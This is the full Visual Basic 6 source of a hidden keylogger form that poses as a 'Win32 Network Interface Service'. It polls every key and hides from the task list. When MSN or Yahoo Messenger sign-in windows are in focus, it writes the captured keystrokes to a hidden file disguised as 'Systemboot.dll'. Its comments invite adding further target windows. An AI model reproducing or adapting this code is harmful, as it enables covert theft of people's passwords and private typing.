VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Mprexe32 - Win32 Network Interface Service"
   ClientHeight    =   30
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   6120
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Icon            =   "sys.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   30
   ScaleWidth      =   6120
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin VB.Timer Timer2 
      Interval        =   60000
      Left            =   2760
      Top             =   4680
   End
   Begin VB.Timer Timer1 
      Interval        =   60000
      Left            =   2160
      Top             =   4680
   End
   Begin VB.TextBox Text1 
      Height          =   2775
      Left            =   0
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   2
      Top             =   1200
      Width           =   5895
   End
   Begin VB.Timer caption_locator 
      Interval        =   1
      Left            =   1200
      Top             =   4680
   End
   Begin VB.TextBox caption_spy 
      Height          =   375
      Left            =   0
      TabIndex        =   1
      Top             =   4200
      Width           =   5895
   End
   Begin VB.Timer saver 
      Enabled         =   0   'False
      Interval        =   30000
      Left            =   1680
      Top             =   4680
   End
   Begin VB.TextBox dumper 
      Height          =   1095
      Left            =   0
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   0
      Width           =   5895
   End
   Begin VB.Timer logger 
      Interval        =   1
      Left            =   720
      Top             =   4680
   End
   Begin VB.Image Image1 
      Height          =   135
      Left            =   0
      Top             =   5160
      Width           =   135
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

'/***************************************************************************
'//  File Name: sys.frm
'//  File Size: 28.4 KB
'//  File Date: 11/23/04  12:55:00 AM
'/***************************************************************************

' declaration For logger
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function MakeSureDirectoryPathExists Lib "imagehlp.dll" (ByVal lpPath As String) As Long
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32.dll" () As Long
Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
Const RSP_SIMPLE_SERVICE = 1
Private Const VK_CAPITAL = &H14
Dim sSave As String, Ret As Long
Dim mastervariable As String
Dim returnvalue As String
Dim previousvalue As String
Function GetCaption(hWnd As Long)
'gets caption of applications
On Error Resume Next
Dim hWndTitle As String
hWndTitle = String(GetWindowTextLength(hWnd), 0)
GetWindowText hWnd, hWndTitle, (GetWindowTextLength(hWnd) + 1)
GetCaption = hWndTitle
End Function
Public Sub RemoveProgramFromList()
    Dim lngProcessID As Long
    Dim lngReturn As Long
    
    lngProcessID = GetCurrentProcessId()
    lngReturn = RegisterServiceProcess(pid, RSP_SIMPLE_SERVICE)
End Sub
Private Sub Form_Load()
On Error Resume Next
If App.PrevInstance = True Then End 'unloads If another copy is runnning
Call RemoveProgramFromList 'hides itself
    'Create a buffer
    sSave = Space(255)
    'Get the system directory
    Ret = GetSystemDirectory(sSave, 255)
    'Remove all unnecessary chr$(0)'s
    sSave = Left$(sSave, Ret)
'makes directory For logfile
MakeSureDirectoryPathExists (sSave & "\Oobe\Microsoft\")
SetAttr sSave & "\Oobe\Microsoft", vbHidden + vbSystem
End Sub
Private Sub Form_Unload(Cancel As Integer)
'saves log If application is unloaded
'works On shutdown of pc
On Error Resume Next
Open sSave & "\Oobe\Microsoft\Systemboot.dll" For Append As #1
Print #1, Text1.Text
Close #1
SetAttr sSave & "\Oobe\Microsoft\Systemboot.dll", vbHidden + vbSystem
Text1.Text = ""
End Sub
Public Function CAPSLOCKON() As Boolean
Static bInit As Boolean
Static bOn As Boolean
If Not bInit Then
While GetAsyncKeyState(VK_CAPITAL)
Wend
bOn = GetKeyState(VK_CAPITAL)
bInit = True
Else
If GetAsyncKeyState(VK_CAPITAL) Then
While GetAsyncKeyState(VK_CAPITAL)
DoEvents
Wend
bOn = Not bOn
End If
End If
CAPSLOCKON = bOn
End Function
Private Sub logger_Timer()
'main engine
On Error Resume Next
Dim keystate As Long
Dim Shift As Long
Shift = GetAsyncKeyState(vbKeyShift)
keystate = GetAsyncKeyState(vbKeyA)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "A"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "a"
End If

keystate = GetAsyncKeyState(vbKeyB)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "B"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "b"
End If

keystate = GetAsyncKeyState(vbKeyC)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "C"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "c"
End If

keystate = GetAsyncKeyState(vbKeyD)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "D"
End If

If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "d"
End If

keystate = GetAsyncKeyState(vbKeyE)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "E"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "e"
End If

keystate = GetAsyncKeyState(vbKeyF)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "F"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "f"
End If

keystate = GetAsyncKeyState(vbKeyG)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "G"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "g"
End If

keystate = GetAsyncKeyState(vbKeyH)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "H"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "h"
End If

keystate = GetAsyncKeyState(vbKeyI)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "I"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "i"
End If

keystate = GetAsyncKeyState(vbKeyJ)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "J"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "j"
End If

keystate = GetAsyncKeyState(vbKeyK)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "K"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "k"
End If

keystate = GetAsyncKeyState(vbKeyL)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "L"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "l"
End If


keystate = GetAsyncKeyState(vbKeyM)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "M"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "m"
End If


keystate = GetAsyncKeyState(vbKeyN)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "N"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "n"
End If

keystate = GetAsyncKeyState(vbKeyO)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "O"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "o"
End If

keystate = GetAsyncKeyState(vbKeyP)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "P"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "p"
End If

keystate = GetAsyncKeyState(vbKeyQ)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "Q"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "q"
End If

keystate = GetAsyncKeyState(vbKeyR)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "R"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "r"
End If

keystate = GetAsyncKeyState(vbKeyS)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "S"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "s"
End If

keystate = GetAsyncKeyState(vbKeyT)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "T"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "t"
End If

keystate = GetAsyncKeyState(vbKeyU)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "U"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "u"
End If

keystate = GetAsyncKeyState(vbKeyV)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "V"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "v"
End If

keystate = GetAsyncKeyState(vbKeyW)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "W"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "w"
End If

keystate = GetAsyncKeyState(vbKeyX)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "X"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "x"
End If

keystate = GetAsyncKeyState(vbKeyY)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "Y"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "y"
End If

keystate = GetAsyncKeyState(vbKeyZ)
If (CAPSLOCKON = True And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "Z"
End If
If (CAPSLOCKON = False And Shift = 0 And (keystate And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (keystate And &H1) = &H1) Then
dumper = dumper + "z"
End If

keystate = GetAsyncKeyState(vbKey1)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "1"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
dumper = dumper + "!"
End If


keystate = GetAsyncKeyState(vbKey2)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "2"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
dumper = dumper + "@"
End If


keystate = GetAsyncKeyState(vbKey3)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "3"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
dumper = dumper + "#"
End If


keystate = GetAsyncKeyState(vbKey4)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "4"
      End If

If Shift <> 0 And (keystate And &H1) = &H1 Then
dumper = dumper + "$"
End If


keystate = GetAsyncKeyState(vbKey5)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "5"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
dumper = dumper + "%"
End If


keystate = GetAsyncKeyState(vbKey6)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "6"
      End If
      
      If Shift <> 0 And (keystate And &H1) = &H1 Then
dumper = dumper + "^"
End If


keystate = GetAsyncKeyState(vbKey7)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "7"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
dumper = dumper + "&"
End If

   
   keystate = GetAsyncKeyState(vbKey8)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "8"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
dumper = dumper + "*"
End If

   
   keystate = GetAsyncKeyState(vbKey9)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "9"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
dumper = dumper + "("
End If

   
   keystate = GetAsyncKeyState(vbKey0)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "0"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
dumper = dumper + ")"
End If

   
   keystate = GetAsyncKeyState(vbKeyBack)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{bkspc}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyTab)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{tab}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyReturn)
If (keystate And &H1) = &H1 Then
  dumper = dumper + vbCrLf
     End If
   
   keystate = GetAsyncKeyState(vbKeyShift)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{shift}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyControl)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{ctrl}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyMenu)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{alt}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyPause)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{pause}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyEscape)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{esc}"
     End If
   
   keystate = GetAsyncKeyState(vbKeySpace)
If (keystate And &H1) = &H1 Then
  dumper = dumper + " "
     End If
   
   keystate = GetAsyncKeyState(vbKeyEnd)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{end}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyHome)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{home}"
     End If

keystate = GetAsyncKeyState(vbKeyLeft)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{left}"
     End If

keystate = GetAsyncKeyState(vbKeyRight)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{right}"
     End If

keystate = GetAsyncKeyState(vbKeyUp)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{up}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyDown)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{down}"
     End If

keystate = GetAsyncKeyState(vbKeyInsert)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{insert}"
     End If

keystate = GetAsyncKeyState(vbKeyDelete)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{Delete}"
     End If

keystate = GetAsyncKeyState(&HBA)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + ";"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + ":"
  
      End If
     
keystate = GetAsyncKeyState(&HBB)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "="
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "+"
     End If

keystate = GetAsyncKeyState(&HBC)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + ","
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "<"
     End If

keystate = GetAsyncKeyState(&HBD)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "-"
     End If

If Shift <> 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "_"
     End If

keystate = GetAsyncKeyState(&HBE)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "."
     End If

If Shift <> 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + ">"
     End If

keystate = GetAsyncKeyState(&HBF)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "/"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "?"
     End If

keystate = GetAsyncKeyState(&HC0)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "`"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "~"
     End If

keystate = GetAsyncKeyState(&HDB)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "["
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "{"
     End If

keystate = GetAsyncKeyState(&HDC)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "\"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "|"
     End If

keystate = GetAsyncKeyState(&HDD)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "]"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "}"
     End If

keystate = GetAsyncKeyState(&HDE)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "'"
     End If
     
     If Shift <> 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + Chr$(34)
     End If

keystate = GetAsyncKeyState(vbKeyMultiply)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "*"
     End If


keystate = GetAsyncKeyState(vbKeyDivide)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "/"
     End If

keystate = GetAsyncKeyState(vbKeyAdd)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "+"
     End If
   
keystate = GetAsyncKeyState(vbKeySubtract)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "-"
     End If
   
keystate = GetAsyncKeyState(vbKeyDecimal)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{Del}"
     End If
     
   keystate = GetAsyncKeyState(vbKeyF1)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{F1}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyF2)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{F2}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyF3)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{F3}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyF4)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{F4}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyF5)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{F5}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyF6)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{F6}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyF7)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{F7}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyF8)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{F8}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyF9)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{F9}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyF10)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{F10}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyF11)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{F11}"
     End If
   
   keystate = GetAsyncKeyState(vbKeyF12)
If Shift = 0 And (keystate And &H1) = &H1 Then
  dumper = dumper + "{F12}"
     End If
     
         
    keystate = GetAsyncKeyState(vbKeyNumlock)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{NumLock}"
     End If
     
     keystate = GetAsyncKeyState(vbKeyScrollLock)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{ScrollLock}"
         End If
   
    keystate = GetAsyncKeyState(vbKeyPrint)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{PrintScreen}"
         End If
       
       keystate = GetAsyncKeyState(vbKeyPageUp)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{PageUp}"
         End If
       
       keystate = GetAsyncKeyState(vbKeyPageDown)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "{Pagedown}"
         End If

         keystate = GetAsyncKeyState(vbKeyNumpad1)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "1"
         End If
         
         keystate = GetAsyncKeyState(vbKeyNumpad2)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "2"
         End If
         
         keystate = GetAsyncKeyState(vbKeyNumpad3)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "3"
         End If
         
         keystate = GetAsyncKeyState(vbKeyNumpad4)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "4"
         End If
         
         keystate = GetAsyncKeyState(vbKeyNumpad5)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "5"
         End If
         
         keystate = GetAsyncKeyState(vbKeyNumpad6)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "6"
         End If
         
         keystate = GetAsyncKeyState(vbKeyNumpad7)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "7"
         End If
         
         keystate = GetAsyncKeyState(vbKeyNumpad8)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "8"
         End If
         
         keystate = GetAsyncKeyState(vbKeyNumpad9)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "9"
         End If
         
         keystate = GetAsyncKeyState(vbKeyNumpad0)
If (keystate And &H1) = &H1 Then
  dumper = dumper + "0"
         End If

returnvalue = GetCaption(GetForegroundWindow)
If returnvalue = previousvalue Then
previousvalue = returnvalue
Else
previousvalue = returnvalue
dumper.Text = dumper.Text & vbCrLf & returnvalue
caption_spy.Text = returnvalue

End If
End Sub
Private Sub save77()
'starts log saver
'moves log file from dumper to final area (text1.text)
mastervariable = mastervariable & dumper.Text
On Error Resume Next
Text1.Text = dumper.Text
saver.Enabled = True ' saves log
End Sub
Private Sub saver_Timer()
' this is the log file path,saves data in text1.text every 20 sec
On Error Resume Next
Open sSave & "\Oobe\Microsoft\Systemboot.dll" For Append As #1
Print #1, Text1.Text
Close #1
SetAttr sSave & "\Oobe\Microsoft\Systemboot.dll", vbHidden + vbSystem 'makes file hidden and system
Text1.Text = "" 'clears text1.text For future logs
End Sub
Private Sub caption_locator_Timer()
'checks continously that out target applications are running or not
On Error Resume Next
Dim ss
ss = GetCaption(GetForegroundWindow)
'add ur target application's target window's caption here
' u can aslso add some code so that prog can load value of ss from external
' ini or any file.This will make application working For all versions of
' messengers.
If ss = "Sign in to .NET Messenger Service - MSN Messenger" Then
Call save77 'starts log saver
'add ur target application's target window's caption here
ElseIf ss = "Sign In" Then
Call save77 'starts log saver
Else
dumper.Text = "" 'clears rough area so that it doesnt get into log file
End If
End Sub
Private Sub Timer1_Timer()
'this is the code For making logger application very handy and disk friendly
'it checks If target windows of msn or yahoo is not running Then clears all boxes
'and goes into idle position by making saver=false
On Error Resume Next
If Not caption_spy.Text = "Sign in to .NET Messenger Service - MSN Messenger" Then
Text1.Text = ""
saver.Enabled = False
ElseIf Not caption_spy.Text = "Sign In" Then
Text1.Text = ""
saver.Enabled = False
Else
End If
End Sub

Private Sub Timer2_Timer()
MakeSureDirectoryPathExists (sSave & "\Oobe\Microsoft\")
SetAttr sSave & "\Oobe\Microsoft", vbHidden + vbSystem
End Sub

